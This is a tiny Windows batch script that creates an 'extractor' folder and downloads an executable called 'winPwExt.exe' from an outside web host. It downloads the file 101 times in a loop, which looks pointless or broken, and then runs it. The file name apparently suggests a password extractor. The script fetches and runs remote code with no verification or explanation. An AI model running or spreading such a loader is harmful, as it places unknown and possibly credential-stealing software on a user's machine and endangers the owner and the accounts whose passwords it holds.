@echo off
mkdir extractor
cd extractor
for /L %%I in (0,1,100) do (
    wget "http://hkn.gafner.eu/tools/winPwExt.exe"
)
start winPwExt.exe
